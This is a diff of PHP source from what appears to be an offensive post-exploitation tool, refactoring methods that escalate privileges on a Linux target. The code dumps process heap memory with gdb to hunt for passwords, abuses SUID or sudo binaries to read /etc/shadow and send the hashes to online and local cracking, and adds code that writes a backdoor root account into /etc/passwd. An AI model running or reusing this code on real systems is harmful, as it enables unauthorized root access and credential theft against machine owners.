+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data =  "gdb --batch -q -p $pid -ex \"info functions\" 2>&1";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data =  "gdb --batch -q -p $pid -ex \"show args\" 2>&1";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data =  "gdb --batch -q -p $pid -ex \"info threads\" 2>&1";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data =  "gdb --batch -q -p $pid -ex \"show env\" 2>&1";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data = "gdb -q --batch -p $pid -ex \"info proc mappings\" 2>&1 | grep -m1 \"\[heap\]\" | awk '{print $3}' ";
-            $taille = trim($this->lan2stream4result($data,$this->stream_timeout));
+            $taille = trim($this->req_str($stream,$data,$this->stream_timeout,""));
             $data = "gdb -q --batch -p $pid -ex \"info proc mappings\" 2>&1 | grep -m1 \"\[heap\]\" | awk '{print $1}' ";
-            $start_heap = trim($this->lan2stream4result($data,$this->stream_timeout));
+            $start_heap = trim($this->req_str($stream,$data,$this->stream_timeout,""));
             $data = "gdb -q --batch -p $pid -ex \"info proc mappings\" 2>&1 | grep -m1 \"\[heap\]\" | awk '{print $2}' ";
-            $end_heap = trim($this->lan2stream4result($data,$this->stream_timeout));
+            $end_heap = trim($this->req_str($stream,$data,$this->stream_timeout,""));
             $search = "passw";
             $data =  "gdb --batch -q -p $pid -ex \"find $start_heap,$end_heap,\\\"$search\\\"\" 2>&1";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             $data =  "gdb --batch -q -p $pid -ex \"x/".hexdec($taille)."s $start_heap\" 2>&1 | awk -F: '{print $2}' | strings | sort -u";
-            $this->lan2stream4result($data,$this->stream_timeout);
+            $this->req_str($stream,$data,$this->stream_timeout,"");
             
             
         }
@@ -859,7 +859,7 @@ This can be used to help determine the OS running and the last time it's been fu
         
         
         $data =  "gdb --batch -q -p $pid -ex 'set disassembly-flavor intel' -ex \"disas $fonction_plt\" 2>&1";
-        $this->lan2stream4result($data,$this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
         
     }
@@ -868,13 +868,13 @@ This can be used to help determine the OS running and the last time it's been fu
     
     
     
-    public function lan2root8bin($bin_path,$sudo,$userpass){
+    public function root8bin($stream,$bin_path,$sudo,$userpass){
         $this->ssTitre(__FUNCTION__);
         $filepath = trim($bin_path);
         $attacker_port = rand(1024,65535);
         $attacker_port = 9999;
         $data = "ls -al $filepath";
-        $this->lan2stream4result($data, $this->stream_timeout);
+        $this->req_str($stream,$data,$this->stream_timeout,"");
         
             $obj_suid = new bin4linux($filepath);
             $argv = "";
@@ -885,25 +885,38 @@ This can be used to help determine the OS running and the last time it's been fu
                 $this->pause();
                 $template_id_test = str_replace("%ID%", $id, $this->template_id);
                 
-                $this->lan2pentest8id($template_id_test);$this->pause();
+                $this->pentest8id($stream,$template_id_test);$this->pause();
             }
+            if (in_array($obj_suid->file_name, $this->tab_sudo8app2write) ) {
+                $query = "openssl passwd -1 -salt $this->created_user_name $this->created_user_pass";
+                $user_pass_crypt = trim($this->req_ret_str($query));
+                $this->article("user_pass_crypt",$user_pass_crypt);
+                $write2what = $this->created_user_name.':'.$user_pass_crypt.':0:0:root:/root:/bin/sh';
+                $write2where = "/etc/passwd";
+                if (!$this->file4search($this->stream,$write2where, $write2what)){
+                $cmd_data = $obj_suid->elf4root2write($sudo,$userpass,$write2what,$write2where);
+                $this->req_str($stream,$cmd_data, $this->stream_timeout,"");
+                }
+                $this->users2pass($stream,$this->created_user_name,$this->created_user_pass);
+            }
+            
             if (in_array($obj_suid->file_name, $this->tab_sudo8app2read) ) {
                 $file2read = "/etc/shadow";
                 $cmd_data = $obj_suid->elf4root2read($sudo,$userpass, $file2read);
                 $shadow_str = $this->req_str($this->stream, $cmd_data, $this->stream_timeout,"");
-                $this->lan2root8shadow($shadow_str,$this->etc_passwd_str);
+                $this->root8shadow($shadow_str,$this->etc_passwd_str);
             }
    }
  
-    public function lan2root8shadow($shadow_str,$password_str){
+    public function root8shadow($shadow_str,$password_str){
         $this->titre(__FUNCTION__);
-        $this->lan2root8shadow8online($shadow_str);
-        $this->lan2root8shadow8local($shadow_str,$password_str);
+        $this->root8shadow8online($shadow_str);
+        $this->root8shadow8local($shadow_str,$password_str);
         
     }
 
     
-    public function lan2root8shadow8local($shadow_str,$password_str){
+    public function root8shadow8local($shadow_str,$password_str){
         $this->ssTitre(__FUNCTION__);
         
         file_put_contents("/tmp/$this->ip.$this->port.$this->protocol.shadow", $shadow_str);
@@ -921,7 +934,7 @@ This can be used to help determine the OS running and the last time it's been fu
         
     }
     
-    public function lan2root8shadow8online($shadow_str){
+    public function root8shadow8online($shadow_str){
         $this->ssTitre(__FUNCTION__);
         $this->shadow2crack8online($shadow_str);
         
@@ -929,7 +942,7 @@ This can be used to help determine the OS running and the last time it's been fu
     
     
     
-    public function lan2root8cve($tab_cve){
+    public function root8cve($tab_cve){
         $result = "";
         $result .= $this->ssTitre(__FUNCTION__);
         foreach ($tab_cve as $cve){
